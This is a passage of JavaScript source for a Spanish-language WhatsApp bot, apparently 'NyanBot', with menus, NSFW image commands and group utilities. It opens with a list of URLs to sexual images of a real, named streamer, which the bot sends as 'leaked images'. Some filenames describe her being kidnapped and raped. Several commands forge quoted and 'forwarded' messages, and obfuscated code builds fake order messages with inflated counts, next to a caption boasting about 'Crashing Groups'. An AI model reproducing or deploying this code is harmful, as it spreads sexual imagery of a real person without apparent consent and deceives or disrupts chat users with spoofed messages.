"https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-21.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-22.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-23.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-24.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-25.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-27.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-28.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-29.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-30.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-31.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-31.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-32.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-33.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-34.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-35.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-36.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-37.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-38.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-39.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-40.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-Delphine-desnuda-y-follando-en-fotos-y-videos-XXX-41.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-1-715x536.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-2-715x536.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-3-715x537.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-4-715x953.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-5.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-6.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-7.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-8.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-9.jpg", "https://www.bytesexy.com/wp-content/uploads/2021/01/Belle-delphine-secuestrada-y-follada-en-un-coche-10-715x859.jpg"]
					bdp = bd[Math.floor(Math.random() * bd.length)]
					sendFileFromUrl(bdp, image, {quoted: fimg, caption: `*Imagenes filtradas de Belle Delphine*\n\n_By @${'5219984907794@s.whatsapp.net'.split("@")[0]}_`, sendEphemeral: true, contextInfo: {mentionedJid: ['5219984907794@s.whatsapp.net']}})
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}xwaifu`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/waifu`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *insane* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}xneko`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/neko`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *insane* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}trap`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/trap`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *insane* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}blow`)){
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					reply('*Buscando una buena imagen...*')
					waifu = await getJson(`https://api.waifu.pics/nsfw/blowjob`)
					sendFileFromUrl(waifu.url, image, {quoted: fimg, caption: '💎 *insane* 💠', sendEphemeral: true})
					addFilter(from)
			}
			}
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`VIP`)){
					reply('*Espera porfavor...*')
			samu330.sendMessage(from, fs.readFileSync('./media/vip.mp4'), video, {quoted: sam, mimetype: 'video/gif', caption: `👑 *REGALITO PARA LOS USUARIOS DE NYANBOT POR PARTE DE @${'5219984907794@s.whatsapp.net'.split("@")[0]}* 🍑`, sendEphemeral: true, duration: -6666666, contextInfo: {mentionedJid: ['5219984907794@s.whatsapp.net']}})
			}
			}

			if (sam.message.listResponseMessage){                                                                           test = sam.message.listResponseMessage.singleSelectReply.selectedRowId  
			if (test.includes(`thanksto`)){
			const ds6 = "50768666666@s.whatsapp.net"
			const aiden = "595986460945@s.whatsapp.net"
			const pike = "51966653383@s.whatsapp.net"
			const pay = "15164688607@s.whatsapp.net"
gracias =
`*Agradecimientos especiales a:*\n\n*[ Kevin (ds6)]*\n✨ Ayuda especial.\n📀 https://github.com/ds6\n< *@${ds6.split('@')[0]}* >\n\n*[ Aiden ]*\n🧩 Ayuda en General.\n📀 https://github.com/iamaidend\n< *@${aiden.split('@')[0]}* >\n\n*[ Pike ]*\n📀 https://github.com/PikennyW\n< *@${pike.split('@')[0]}* >\n\n\n✨Agradecimientos Especiales:\n\n< *@${pay.split('@')[0]}* >`
			samu330.sendMessage(from, `${gracias}`, MessageType.text, {sendEphemeral: true, quoted:  { key: {
				            fromMe: false,
				            participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "5219984907794@s.whatsapp.net" } : {})
				            },
					                message: {
							            "documentMessage": { "title": `🍉Samu330🍒`, 'jpegThumbnail': fs.readFileSync('./media/SmWW.png')}}
								                }, contextInfo: {"externalAdReply": { "title": "🎩 | সামু৩৩০🏹", "body": "[ ★ ] 山姆 330", "sourceUrl": `https://youtube.com/channel/UCHD4T8Pfcv5PFVzsAbfAPZA`, "thumbnail": fs.readFileSync('./media/reply.png')}, mentionedJid: [ds6, aiden, pike, pay]}})
                                                                                                                                  }                                                                                                         }

			/*if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}lesbian`)){
			
			}
			}*/
			
	    
	//Zona de Comandos🛵
switch (command) {

case 'help':
case 'menu':
case 'comandos':
samu330.sendMessage(from, fs.readFileSync(`./temp/menu.webp`), sticker, {quoted: fimg, "forwardingScore": 9999, "isForwarded": true})
break

case 'menuofc':

redes = ['']
opcion = redes[Math.floor(Math.random() * redes.length)]

var num = sam.participant
foto = fs.readFileSync('./src/help.jpg')
fakee = fs.readFileSync('./src/fake.jpg')
assistant = fs.readFileSync('./src/assistant.jpg')
const forder = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "5214447000377-1624232428@g.us" } : {})},message: {orderMessage: {itemCount : 999999999,status: 1,surface : 1,message: `🥀insane`,orderTitle: 'insane',sellerJid: `�insane�🌱`,thumbnail: fs.readFileSync('./src/fake.jpg')}}}
samu330.updatePresence(from, Presence.recording)
uptime = process.uptime()
		
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Para usar insane escribe* *.reg*, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
try {		
Menu = `
➫ြ
🔐Hola *${pushname}* ${timeFt}

_Tipo de usuario:_ ${tipoDeUsr}
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevelingLevel(sender)}
🕋rango: ${rango}

🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*

${opcion}


===============================


*Comandos usados hoy : ${hit_today.length}*

_PORFAVOR LEE LAS REGLAS_:

${prefix}reglas
`
addFilter(from)
addLevelingLevel(sender, 5)
var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','3184312811796096','2ZQhqXh','37BvfGXn','1QpYCgS','233589MYSAPS','296046BsnUGu','./src/fake.jpg','11131Xmdsqw',`${Menu}`,'41623ZFgijY','4lYyqCf','INQUIRY','prepareMessageFromContent','1081869VYGFAG','1QmBtcR'];var _0x3cb2d7=_0x44c4;function _0x44c4(_0x538587,_0x3dc520){return _0x44c4=function(_0x56dab7,_0x44c4ad){_0x56dab7=_0x56dab7-0x11b;var _0x4c2ec7=_0x56da[_0x56dab7];return _0x4c2ec7;},_0x44c4(_0x538587,_0x3dc520);}(function(_0x1c8e57,_0x5dcd2a){var _0x2b3ad5=_0x44c4;while(!![]){try{var _0x1e1a08=parseInt(_0x2b3ad5(0x11b))*parseInt(_0x2b3ad5(0x127))+parseInt(_0x2b3ad5(0x12c))+parseInt(_0x2b3ad5(0x122))+parseInt(_0x2b3ad5(0x11e))*parseInt(_0x2b3ad5(0x121))+parseInt(_0x2b3ad5(0x126))*-parseInt(_0x2b3ad5(0x12b))+parseInt(_0x2b3ad5(0x124))*parseInt(_0x2b3ad5(0x11f))+-parseInt(_0x2b3ad5(0x120))*parseInt(_0x2b3ad5(0x12a));if(_0x1e1a08===_0x5dcd2a)break;else _0x1c8e57['push'](_0x1c8e57['shift']());}catch(_0x52a340){_0x1c8e57['push'](_0x1c8e57['shift']());}}}(_0x56da,0x99469),res=await samu330[_0x3cb2d7(0x129)](from,{'orderMessage':{'orderId':_0x3cb2d7(0x11d),'thumbnail':fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)),'itemCount':999999999,'status':_0x3cb2d7(0x128),'surface':'CATALOG','message':_0x3cb2d7(0x125),'orderTitle':'tom esta durmiendo'},'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}},{'quoted':forder,'contextInfo':{}}),samu330[_0x3cb2d7(0x12d)](res));
} catch {
samu330.sendMessage(from, fs.readFileSync('./src/ara.png'), image, {quoted: ftoko, caption: Menu, thumbnail: fs.readFileSync('./src/ara.png'), sendEphemeral: true})
}
break

case 'menu2':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
samu330.sendMessage(from, `${stc}`, MessageType.text, {quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"documentMessage": { "title": "📚𝑆𝑡𝑖𝑘𝑒𝑟 𝑚𝑒𝑛𝑢", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu1':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
trol = fs.readFileSync('./media/trol.mp4')
samu330.sendMessage(from, trol, video, {mimetype: 'video/mp4', caption: `${mda}`, duration: -9999999, thumbnail: fs.readFileSync('./media/reply.png'), sendEphemeral: true, quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": { "caption": "🧸𝙈𝙀𝙉𝙐⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼📌", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
samu330.sendMessage(from, fs.readFileSync('./temp/nana.mp3'), audio, {quoted: ftoko, mimetype: "audio/mp3", ptt: true, duration: 5555555, sendEphermeral: true})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu3':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
addFilter(from)
addLevelingLevel(sender, 5)		
samu330.sendMessage(from, Menug, MessageType.text, {
quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
break

case 'menu4':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
samu330.sendMessage(from, `${Menud}`, MessageType.text, {
quoted:  fvid})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu5':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
samu330.sendMessage(from, `${Menuo}`, MessageType.text, {
quoted: floc})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu7':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
samu330.sendMessage(from, `${Menu7}`, MessageType.text, {
quoted: fvid})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu8':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
quoted: ftoko})
addFilter(from)
addLevelingLevel(sender, 5)		
break
		
case 'menu9':
if (!isRegister) return reply(mess.only.usrReg)
reply('*Gathering information...*')
smww = fs.readFileSync(`./media/SmWW.png`)
samu330.sendMessage(from, smww, image, {caption: `${menu9}`, quoted: { key: { 
	fromMe: false, 
	participant: `0@s.whatsapp.net`, ...(from ? {
		remoteJid: "status@broadcast" } : {}) }, 
			message: { 
				"imageMessage": { 
				"mimetype": 
				"image/jpeg", 
				"caption": "➫'*👑Samu330 Crashing Groups!!🔥*'\n'😈Samu330 Domina🥀'" ,
				"jpegThumbnail": fs.readFileSync(`./src/ara.png`)}}}})
break


case 'gracias':
var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','3184312811796096','2ZQhqXh','37BvfGXn','1QpYCgS','233589MYSAPS','296046BsnUGu','./src/fake.jpg','11131Xmdsqw','🤭 *Tranqui, no es nada* 😉','41623ZFgijY','4lYyqCf','INQUIRY','prepareMessageFromContent','1081869VYGFAG','1QmBtcR'];var _0x3cb2d7=_0x44c4;function _0x44c4(_0x538587,_0x3dc520){return _0x44c4=function(_0x56dab7,_0x44c4ad){_0x56dab7=_0x56dab7-0x11b;var _0x4c2ec7=_0x56da[_0x56dab7];return _0x4c2ec7;},_0x44c4(_0x538587,_0x3dc520);}(function(_0x1c8e57,_0x5dcd2a){var _0x2b3ad5=_0x44c4;while(!![]){try{var _0x1e1a08=parseInt(_0x2b3ad5(0x11b))*parseInt(_0x2b3ad5(0x127))+parseInt(_0x2b3ad5(0x12c))+parseInt(_0x2b3ad5(0x122))+parseInt(_0x2b3ad5(0x11e))*parseInt(_0x2b3ad5(0x121))+parseInt(_0x2b3ad5(0x126))*-parseInt(_0x2b3ad5(0x12b))+parseInt(_0x2b3ad5(0x124))*parseInt(_0x2b3ad5(0x11f))+-parseInt(_0x2b3ad5(0x120))*parseInt(_0x2b3ad5(0x12a));if(_0x1e1a08===_0x5dcd2a)break;else _0x1c8e57['push'](_0x1c8e57['shift']());}catch(_0x52a340){_0x1c8e57['push'](_0x1c8e57['shift']());}}}(_0x56da,0x99469),res=await samu330[_0x3cb2d7(0x129)](from,{'orderMessage':{'orderId':_0x3cb2d7(0x11d),'thumbnail':fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)),'itemCount':999999999,'status':_0x3cb2d7(0x128),'surface':'CATALOG','message':_0x3cb2d7(0x125),'orderTitle':''},'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}},{'quoted':sam,'contextInfo':{}}),samu330[_0x3cb2d7(0x12d)](res));
break

case 'nuevo':
nuevo = `🤔 *Que hay de nuevo?* 🤗

- _Menu 6_
*Nuevo comando belle*

- _Menu de Stickers:_

sgay: Stickers con efecto Gay.
srip: Stickers con efecto de tumba.
scarcel: Stickers con efecto de carcel.

- _Menu de media:_

*Nuevos efectos de video y audio!!*

🎞 Video:
*vrapido*
*vlento*
*mirror*
*vefecto*
*sinsonido*

🎧 Audio:
*fantasma*
*robot*

- Otros comandos:

_grupos_
_enlinea_
_Adminlist_`
reply(nuevo)
break



case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await samu330.messageInfo(from, sam.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `✅ Este Mensaje ah sido visto por:\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `📲 Hora: ` + moment(`${i.t}` * 1000).tz('America/Mexico_City').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break

case 'audiodur':
encmediam = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
mediam = await samu330.downloadAndSaveMediaMessage(encmediam)
cokmatane = Number(args[0])
hah = fs.readFileSync(mediam)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:faud})
fs.unlinkSync(mediam)
break

		
case 'top5':
addFilter(from)
if (!isGroup) return reply('*Este comando solo puede usarse en grupos🤕')
member = []
top5 = args.join(' ')
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
teks = `
*😵TOP CINCO:*\n\n1= @${o1.jid.split('@')[0]}\n\n2=@${o2.jid.split('@')[0]}\n\n3=@${o3.jid.split('@')[0]}\n\n4= @${o4.jid.split('@')[0]}\n\n5= @${o5.jid.split('@')[0]}\n\n\n_Top 5  en este grupo`
member.push(o1.jid)
member.push(o2.jid)
member.push(o3.jid)
member.push(o4.jid)
member.push(o5.jid)
mentions(teks, member, true)
break
		
case 'pregunta':
respuesta = ['Si', 'No', 'Tal vez', 'Puede ser', 'Ai una probabilidad del 99.99999999991.01%', 'Puede que no', 'Yo que se', 'mmmm🤔.... Dejame lo pienso un poco']
answer = respuesta[Math.floor(Math.random() * respuesta.length)]
if (!q) return reply('Y la pregunta?')
reply(answer)
addFilter(from)
break
		
case 'lirik':
case 'letra':
case 'letras':
if (args.length < 1) return reply('Escribe el nombre de la cancion')
if (!isRegister) return reply(mess.only.usrReg)
samu330.updatePresence(from, Presence.composing)
if (!q) return reply('*Cual es el nombre de la cancion?*')
try {
anu = await getJson(`https://some-random-api.ml/lyrics?title=${q}`)
lyrics = `🥰Resultado de ${anu.title}:\n\n*Autor:* ${anu.author}\n\n____________________\n\n${anu.lyrics}\n\n🌬Link: ${anu.links.genius}`
sendFileFromUrl(anu.thumbnail.genius, image, {quoted: fimg, caption: lyrics, sendEphemeral: true})
} catch {
reply(mess.ferr)
}
addFilter(from)
break

case 'b1':
        
        txtt =`Hola ${pushname}\nEscoje tu opcion... `

               buttons1 = [{buttonId:`${prefix}menu`, 
               buttonText:{displayText: 'Show Menu'},type:1},
               {buttonId:`${prefix}owner`,buttonText:{displayText:'Owner'},type:1},
               {buttonId:`${prefix}ytadmin`,buttonText:{displayText:'YouTube'},type:1}]

               imageMsg = (await samu330.prepareMessageMedia(fs.readFileSync(`./src/fake.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./src/fake.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: '© insane', imageMessage: imageMsg,
               buttons: buttons1,
               headerType: 4
}

               prep = await samu330.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftoko})
               samu330.relayWAMessage(prep)
               break
		
		
		



case 'baileys':
reply(`${sam.quoted.isBaileys}`)
break    

case 'unavista':
resview = await samu330.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": fs.readFileSync('./media/reply.png'),
"viewOnce": true
}
}
}
}, {}) 
samu330.relayWAMessage(resview)
break

case 'demoteall':
if (!isOwner) return reply(mess.only.ownerB)
if (!isGroup) return reply(mess.only.group)
if (!botAdmin) return reply(mess.only.Badmin)
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
samu330.groupDemoteAdmin(from, members_id)
break
case 'promoteall':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isGroup) return reply(mess.only.group)
if (!botAdmin) return reply(mess.only.Badmin)
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
samu330.groupMakeAdmin(from, members_id)
break

case 'test9':
grup12 = samu330.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '573152139466-1616220327@g.us', "inviteCode": 'https://chat.whatsapp.com/BGTQNDzESmEJr2cCJlccWV', "groupName": `🍒Grupo Oficial de NyanBot💎`, "footerText": "*_© Samu330_*", "jpegThumbnail": fs.readFileSync('./src/ara.png'), "caption": q, "inviteCode": "yv4xLt3+eglcsUG7", "inviteExpiration": "1631410397"}}, {quoted:sam})
samu330.relayWAMessage(grup12)
break

case 'bt':
    res13 = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": 'blablabla', "footerText": "*_© Samu330_*", "thumbnail": fs.readFileSync('./src/ara.png'), "surface": 'CATALOG' }}, {quoted:sam})
    samu330.relayWAMessage(res13)
break

case 'bt2':
    sendButLocation(from, `hola`, `tests`, {jpegThumbnail: fs.readFileSync('./src/fake.jpg')}, [{buttonId:`${prefix}status`,buttonText:{displayText:'1'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'2'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'3'},type:1}], {contextInfo: { mentionedJid: [sender]}})
break
	
//Evaluar ecuaciones By Samu330
/**/case 'calc':
/**/global.math = global.math ? global.math : {}
/**/let ed = from
/**/if (ed in global.math) {
/**/clearTimeout(global.math[ed][3])
/**/delete global.math[ed]
/**/reply('Hmmm...y la ecuacion?')
/**/}
/**/let val = q
/**/.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
/**/.replace(/×/g, '*')
/**/.replace(/÷/g, '/')
/**/.replace(/π|pi/gi, 'Math.PI')
/**/.replace(/e/gi, 'Math.E')
/**/.replace(/\/+/g, '/')
/**/.replace(/\++/g, '+')
/**/.replace(/-+/g, '-')
/**/let format = val
/**/.replace(/Math\.PI/g, 'π')
/**/.replace(/Math\.E/g, 'e')
/**/.replace(/\//g, '÷')
/**/.replace(/\*×/g, '×')
/**/try {
/**/console.log(val)
/**/let result = (new Function('return ' + val))()
/**/if (!result) throw result
/**/reply(`
           CALCULADORA
╭──╼┥𝈸𖾗ᷤ𖾕꯭ͣ𖾔꯭𖾔ͫ𖽙ͧ𝈹┝╾──╮
╽ ┌──────────┐ ┃
┃   *${format}*
┃ ├──────────┤ ┃
┃   *Resultado*:
┃ ├──────────┤ ┃
┃  _${result}_
╿ └──────────┘ ╿
╰─┨ ⃞📟 𝜍𝛼𝜄𝜍 📟⃞ ┠─╯`)
/**/} catch (e) {
/**/if (e == undefined) throw '?'
/**/throw 'Formato incorrecto, solo 0-9 y símbolo -, +, *, /, ×, ÷, π, e, (, ) son compatibles'
/**/}
/**/addFilter(from)
/**/break

case 'google':
assistant = fs.readFileSync('./src/assistant.jpg')
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
let buscar = args.join(' ')
if (!buscar) return reply('Que deseas buscar?')
let search = await samuGg({ query: buscar })
let ggsm = ``
for (let i of search) {
ggsm += `
*Titulo :* ${i.title}
*Link :* ${i.link}
*Contenido :* ${i.snippet}

`
}
var nyangg = ggsm.trim()
reply(`*🔍Busqueda realizada por* 🐉Samu330🐉\n\n${nyangg}`)
addFilter(from)
break
			
case 'imagen':
assistant = fs.readFileSync('./src/assistant.jpg')
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Que deseas buscar?')
reply(`Porfavor espera un momento mientras busco imagenes de ` + args.join(' '))
ggimg = args.join(' ')
res = await samuGgImg(ggimg, google)
function google(error, result){
if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: sam, caption: `*🔍Busqueda de* _${ggimg}_\n*Realizada por 🐉Samu330🐉*`})
}
}
addFilter(from)
break

case 'wp':
assistant = fs.readFileSync('./src/assistant.jpg')
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
reply('*Buscando un fondo de pantalla para ti :)*')
res = await samuGgImg(`fondos de pantalla 4k ${q}`, google)
function google(error, result){
if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
else {
var gugWp = result
var randomWp =  gugWp[Math.floor(Math.random() * gugWp.length)].url
sendFileFromUrl(randomWp, image, {quoted: sam, caption: `*espero que te guste✅*`})
}
}
addFilter(from)
break

case 'apagar':
if (!isOwner) return reply('tu quien eres para decirme que hacer!?🤔')
reply('Me apagare en 3 Segundos....')
setTimeout( () => {
samu330.close() }, 3000)
break

	
case 'actualizar':
case 'update':
if (!itsMe) return reply('solo ownrrt!!!!🤔')
exec(`bash update.sh`, (err, stdout) => {
if (err) return reply(err)
if (stdout) reply(`*insane se ah actualizado *\n Informe de la actualización:\n\n${stdout}\n\nLos cambios se mostraran despues de volver a iniciar insane.`)
})
break
		
case 'grupos':
samu330.updatePresence(from, Presence.composing)
samu330.sendMessage(from, `*CHATS TOTALES* : ${totalchat.length} Chat`, MessageType.text, {quoted  : floc})
break
		
case 'zalgo':
if (args.length < 1) return reply("Escriba una frase despues del comando para poder continuar!")
reply(zalgo(`${body.slice(6)}`))
addFilter(from)
break
		
case 'contar':
addFilter(from)
if (args.length == 0) return reply('0 caracteres!😀 NO HAY TEXTO PARA CONTAR!')
const count = body.slice(8).length
if (count === 1) {
reply(`El texto solo contine *${count}* caracter.`)
} else if (count > 1) {
reply(`Su texto contiene *${count}* caracteres.`)
}
break

case 'dados':
rmd = [
result = fs.readFileSync(`./temp/1.webp`),
result1 = fs.readFileSync(`./temp/2.webp`),
result2 = fs.readFileSync(`./temp/3.webp`),
result3 = fs.readFileSync(`./temp/4.webp`),
